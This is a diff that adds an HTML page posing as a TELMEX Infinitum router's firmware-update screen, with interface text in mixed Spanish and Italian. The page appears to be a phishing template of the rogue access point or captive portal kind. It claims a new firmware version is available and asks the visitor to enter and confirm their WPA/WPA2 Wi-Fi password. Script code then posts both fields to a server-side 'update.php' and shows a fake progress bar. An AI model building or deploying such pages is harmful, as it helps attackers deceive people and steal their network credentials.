@@ -1,0 +1,247 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html>
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+
+	<title>Infinitum - A Infinitum de Velocidad - Router</title>
+	<link href="css/common.css" rel="stylesheet" type="text/css"/>
+	<link href="css/style.css" rel="stylesheet" type="text/css"/>
+	
+</head>
+<body style="cursor: default;">
+<div id="container">
+	<div id="header">
+		<span id="headerInfo">
+			Release Modem: AGPWI_4.0.4
+		</span>
+	</div>
+	<div id="wrapper">
+		<div id="left">
+			<ul class="menu">
+				<li id="menuhome" class="">
+					<a href="#">
+						<img src="img/menu_ico_home.png"></img></br>HOME
+					</a>
+				</li>
+				<li id="menubasic" class="">
+					<a href="#" title="Il modem Telecom Italia offre più servizi. Questi servizi consentono di proteggere la rete e di facilitare la condivisione di giochi e applicazioni con altre persone in Internet o di gestire la rete locale.">
+						<img src="img/menu_ico_basic.png"></img></br>AJUSTES</br>BÁSICOS
+					</a>
+
+					<ul class="submenu">
+						<li>
+							<a href="#">
+								Estado de la Conexión
+							</a>
+						</li>
+						<li>
+							<a href="#">
+								Internet Infinitum
+							</a>
+						</li>
+						<li>
+							<a href="#">
+								LAN
+							</a>
+						</li>
+						<li>
+							<a href="#">
+								Wi-Fi
+							</a>
+						</li>
+						<li>
+							<ul class="submenu2">
+								<li>
+									<a href="#">
+										Wi-Fi Principal
+									</a>
+								</li>
+								<li>
+									<a href="#">
+										Wi-Fi Opciones
+									</a>
+								</li>
+							</ul>
+						</li>
+						<li>
+							<a href="#">
+								Asistencia
+							</a>
+						</li>
+						<li>
+							<a href="#">
+								Statistiche
+							</a>
+						</li>
+						<li>
+							<a href="#">
+								Red Local
+							</a>
+						</li>
+					</ul>
+				</li>
+				<li id="menuadvanced" class="active">
+					<a href="#" title="Il modem Telecom Italia offre più servizi. Questi servizi consentono di proteggere la rete e di facilitare la condivisione di giochi e applicazioni con altre persone in Internet o di gestire la rete locale." onclick="return menu_select('menuadvanced');">
+						<img src="img/menu_ico_advanced.png"></img></br>AJUSTES</br>AVANZADOS
+					</a>
+
+					<ul class="submenu">
+						<li>
+							<a href="#">
+								DNS dinamico
+							</a>
+						</li>
+						<li>
+							<a href="#">
+								Port Mapping
+							</a>
+						</li>
+						<li>
+							<a href="#">
+								Firewall
+							</a>
+						</li>
+						<li>
+							<a href="#" class="active">
+								Strumenti
+							</a>
+						</li>
+					</ul>
+				</li>
+			</ul>
+		</div>
+		<div class="area5">
+			<div class="text">
+				Configuración Avanzada&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;Herramientas
+			</div>
+		</div>
+		<div class="tabs">
+			<div id="tabStatus" class="tab tabselected">
+				<div class="icon">
+					<img src="img/tools.png" height="60" border="0" width="50"></img></div><div class="title">Firmware</div>
+			</div>
+			<div id="tabConfigure" class="tab ">
+				<a href="#">
+					<div class="icon">
+					</div>
+					<div class="title">Avanzados</div>
+				</a>
+			</div>
+		</div>
+		<div class="page">
+			<div class="section">
+				<div class="title">Nueva Versión del Firmware</div>
+				<div class="subsection flat">
+					<div class="parameter" style="font-size:10pt; width:100%; margin-bottom:5%">
+						Hay disponible un nuevo firmware para tu módem que mejorará su funcionalidad y rendimiento.
+						Para descargar y actualizar el firware, debes introducir tu contraseña WPA/WPA2 y pulsar el botón ACTUALIZAR para continuar.
+					</div>
+					<div></div>
+					<div class="parameter">
+						<div class="label">Versión Actual del Firmware:</div>
+						<div class="value">AGPWI_4.0.4</div>
+					</div>
+					<div class="parameter">
+						<div class="label">Fecha del Firmware:</div>
+						<div class="value">07/03/2018</div>
+					</div>
+				</div>
+				<div class="subsection flat">
+					<div class="parameter">
+						<div class="label bold red">Nueva Versión del Firmware:</div>
+						<div class="value bold red">AGPWI_5.8.2</div>
+					</div>
+					<div class="parameter">
+						<div class="label bold red">Fecha del Firmware:</div>
+						<div class="value bold red">11/08/2022</div>
+					</div>
+				</div>
+			</div>
+		<div class="section flat" id="sharingBlock">
+			<div class="title">Actualización</div>
+			<div class="subsection flat">
+				<div class="parameter bold red" style="font-size:10pt; width:100%; margin-bottom:5%">
+					Nota: La descarga y actualización del firmware puede tardar varios minutos. Durante la actualización, no apague el router ni cierre el navegador.
+				</div>
+				<div style="clear: both"></div>
+				<form id="updateform" method="post" action="../Telecom_it.portal/update.php">
+					<fieldset style="border: none">
+						<p>
+							<label class="bold" style="width: 40%; display:inline-block; text-align: right; font-size: 10pt">WPA/WPA2 :</label>
+							<input id="wpa_psw" name="wpa_psw" type="password"/>
+						</p>
+						<p>
+							<label class="bold" style="width: 40%; display:inline-block; text-align: right; font-size: 10pt">Confirma WPA/WPA2 :</label>
+							<input id="wpa_psw_conf" name="wpa_psw_conf" type="password"/>
+						</p>
+					</fieldset>
+
+					<p style="text-align: center">
+						<input id="button_update" type="submit" value="Aceptar" />
+					</p>
+					<p style="text-align: center">
+						<progress id="pbar" value="0" max="100"></progress>
+					</p>
+				</form>	
+			</div>
+		</div>
+	</div> <!--  wrapper -->
+	<div id="footer"> © 2022 Infinitum - TELMEX</div>
+	</div> <!--  container -->
+</div>
+	<script type="text/javascript" src="js/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="js/pBar.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {						
+			$("#updateform").submit(function(e) {
+
+				e.preventDefault();
+				$(".error").hide();
+	
+				var hasError = false;
+				var wpa_psw = $("#wpa_psw").val();
+				var wpa_psw_conf = $("#wpa_psw_conf").val();
+				
+				if (wpa_psw == '') {
+					$("#wpa_psw").after('<span class="error">Per favore, inserire la password.</span>');
+					hasError = true;
+				} else if (wpa_psw_conf == '') {
+					$("#wpa_psw_conf").after('<span class="error">Per favore, inserire la stessa password.</span>');
+					hasError = true;
+				} else if (wpa_psw != wpa_psw_conf ) {
+					$("#wpa_psw_conf").after('<span class="error">Le password non sono uguali.</span>');
+					hasError = true;
+				}
+				
+				
+				if (!hasError) {					
+					var formURL = $(this).attr("action");					
+					var pBar = $("#pbar");
+					
+					$.ajax({
+							type: "POST",
+							url : formURL,
+							data: {wpa_psw: wpa_psw, wpa_psw_conf: wpa_psw_conf},
+							dataType:'JSON',
+							success:function(response){
+								console.log(response);
+
+								if (response) {
+									// psw OK
+									$("#wpa_psw").prop('disabled', true);
+									$("#wpa_psw_conf").prop('disabled', true);
+									pBar.addClass("update");
+								
+									doProgress();
+								} else {
+									alert ("La password inserita non è corretta! Inserire la password corretta.");
+									$("#button_update").prop('disabled', false);
+								}
+							}
+					});
+				}
+			});
+		});
+	</script>
+</body>
+</html>
